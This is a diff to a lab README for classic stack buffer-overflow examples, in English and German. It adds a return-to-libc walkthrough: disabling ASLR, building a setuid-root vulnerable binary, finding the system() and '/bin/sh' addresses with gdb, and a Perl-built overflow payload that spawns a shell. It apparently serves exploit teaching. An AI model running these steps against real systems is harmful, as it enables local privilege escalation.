@@ -11,7 +11,7 @@ Abstract:
 =========
   vuln1.c and vuln2.c are two classical stack based bufferoverflow examples. 
   These code-snippets and exploits are largely inspired by [1]
-  The examples are local bufferoverflows that can be exploited by a unprivilaged user,
+  The examples are local bufferoverflows that can be exploited by a unprivileges user,
   to gain root access through a vulnerable suid programm (vuln1.c, vuln2.c)
 
 Requirements:
@@ -82,7 +82,30 @@ Auflistung der Schritte:
 
 	Variante 3: Return to libc
 	-----------
-	* 
+	* echo 0 > /proc/sys/kernel/randomize_va_space
+        * gcc vuln2.c -o vuln2 -z execstack
+          # or explicitly disable "stack-protector" aka. stack cookies
+          # and/or make stack explicitly executable and so disable non-executable stack:
+          # gcc vuln2.c -o vuln2 -ggdb -fno-stack-protector -z execstack
+        * chown root.users vuln2
+        * chmod +s vuln2
+	* gcc getsystem.c -o getsystem
+	* gcc getenvaddr.c -o getenvaddr
+	* su unpriv
+	* gdb getsystem
+		(gdb) break main
+		(gdb) run
+		(gdb) p system
+		# remember the address of the system() function
+		# $1 = {<text variable, no debug info>} 0xb7ed56e0 <system>
+	* export SH="/bin/sh"
+	* ./getenvaddr SH
+	  # remember the address of the environment variable that holds the string "/bin/sh"
+	  # SH is located at 0xbffffeb8 
+	* vuln2 `perl -e 'print "\x42"x28 . "\xe0\x56\xed\xb7ABCD\xc2\xfe\xff\xbf";'`
+	  # proberbly you have to tweek the value for the BBBBBB... padding as well as the last byte of the location of
+	  # SH to find the string "/bin/sh" in the memory. In our case this value was increased by 10
+	==> spawns /bin/sh but system() drops root privileges. 	  
 
 Beschreibung:
 =============
@@ -102,7 +125,12 @@ Beschreibung:
 
         Variante 3: Return to libc
         -----------
-        *
+        In diesem beispiel wird die vuln2.c applickation durch einen return to libc exploit dazu gebracht eine shell ("/bin/sh") zu oeffnen.
+	Zu diesem zweck muss die memory addresse der system() function bekannt sein. Diese kann mithilfe des programms getsystem.c und gdb 
+	herausgefunden werden. da system drei parameter braucht <system address>(<ret address>, <target address>) muessen diese richtig auf 
+	den stack gepusht werden. Da die ret addresse egal ist weil eine interaktive shell ("/bin/sh") geoeffnet wird kann dieser wert durch
+	ein 4byte dummy wort ("ABCD") ersetzt werden. 
+	Da system() alle priveleges dropt ist /bin/sh keine root shell. Um root rechte zu erlangen  muesste beispielsweise execl() verwendet werden.
  
 Referenzen:
 ============
